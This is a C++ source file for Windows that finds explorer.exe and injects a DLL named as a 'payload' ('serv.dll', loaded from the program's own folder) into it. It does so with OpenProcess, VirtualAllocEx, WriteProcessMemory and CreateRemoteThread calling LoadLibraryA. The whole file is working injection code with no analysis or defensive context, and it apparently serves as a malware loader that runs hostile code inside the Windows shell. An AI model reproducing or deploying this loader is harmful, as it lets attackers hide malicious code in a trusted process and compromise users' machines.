#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <string>

std::string ChooseDLL()
{
	OPENFILENAME ofn;
	char fileName[MAX_PATH] = "";
	ZeroMemory(&ofn, sizeof(ofn));
	ofn.lStructSize = sizeof(OPENFILENAME);
	ofn.lpstrFile = fileName;
	ofn.nMaxFile = MAX_PATH;
	if (GetOpenFileName(&ofn))
		return fileName;
}

#define PAYLOAD_FILE "/serv.dll"

int main()
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (strcmp(entry.szExeFile, "explorer.exe") == 0)
			{
				//std::string stringPath = ChooseDLL();
				
				char buffer[MAX_PATH];
				GetModuleFileNameA(NULL, buffer, MAX_PATH);
				std::string::size_type pos = std::string(buffer).find_last_of("\\/");
				std::string stringPath = std::string(buffer).substr(0, pos) + PAYLOAD_FILE;

				const char* dllPath = stringPath.c_str();

				DWORD pID = entry.th32ProcessID;
				std::cout << pID << std::endl;

				if (!pID)
				{
					//MessageBoxA(NULL, "Couldn't find windows shell", "Error", NULL);
					return 1;
				}

				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, pID);

				if (hProcess == INVALID_HANDLE_VALUE)
				{
					//MessageBoxA(NULL, "Couldn't get handle to windows shell", "Error", NULL);
					return 1;
				}

				void* allocMemory = VirtualAllocEx(hProcess, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

				WriteProcessMemory(hProcess, allocMemory, dllPath, MAX_PATH, 0);

				HANDLE hThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, allocMemory, 0, 0);

				if (hThread)
				{
					//VirtualFreeEx(hProcess, allocMemory, NULL, MEM_RELEASE);
					CloseHandle(hThread);
					CloseHandle(hProcess);
				}
			}
		}
	}

	CloseHandle(snapshot);

	return 0;
}
